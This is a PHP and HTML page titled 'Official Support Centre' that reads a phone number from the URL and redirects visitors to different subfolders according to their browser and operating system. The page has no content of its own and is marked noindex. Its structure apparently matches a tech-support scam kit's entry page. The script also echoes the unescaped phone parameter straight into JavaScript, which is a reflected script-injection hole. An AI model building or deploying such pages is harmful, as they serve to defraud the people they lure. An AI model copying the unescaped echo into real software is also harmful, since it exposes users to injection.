<?php


$phone_number=$_GET["phone"];
?>
<xmlns="http:/www.w3.org/1999/xhtml">
<head>



    
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta name="robots" content="noindex,nofollow">
    <title>Official Support Centre</title>

    <script type="text/javascript">
        var isChromium = window.chrome,
            vendorName = window.navigator.vendor,
            isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
            isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
        if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
        {
            // is Google chrome
            window.location.href = "./sefer0/?phone=<?=$phone_number?>";
        }
        if (navigator.userAgent.indexOf("Firefox") != -1) {
            window.location.href = "./sefer0/?phone=<?=$phone_number?>";
        }
        if (window.navigator.userAgent.indexOf("Edge") != -1) {
            window.location.href = "./sefer0/?phone=<?=$phone_number?>";
        }
if (window.navigator.userAgent.indexOf("Opera") != -1) {
            window.location.href = "./sefer0/?phone=<?=$phone_number?>";
        }

        if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
        {
            window.location.href = "./sefer0/?phone=<?=$phone_number?>";
        }


        if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";

        var isOpera = !!window.opera || navigator.userAgent.indexOf('Opera') >= 0;
        // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
        var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
        // At least Safari 3+: "[object HTMLElementConstructor]"
        var isChrome = !!window.chrome;                          // Chrome 1+
        var isIE = /*@cc_on!@*/false;                            // At least IE6

        if (OSName == "MacOS" && isChrome == true) {
            window.location.href = "./defer0/?phone=<?=$phone_number?>";
        }
        else if (OSName == "MacOS" && isChrome == true) {
            window.location.href = "./defer0/?phone=<?=$phone_number?>";
        }

        if (navigator.userAgent.indexOf("Firefox") != -1) {
            window.location.href = "./defer0/?phone=<?=$phone_number?>";
        }

        if (window.navigator.userAgent.indexOf("Opera") != -1) {
            window.location.href = "./defer0/?phone=<?=$phone_number?>";
        }

        if (navigator.userAgent.indexOf("Safari") != -1) {
            window.location.href = "./defer0/?phone=<?=$phone_number?>";
        }

    </script>

</head>
<body>

</body>


</html>
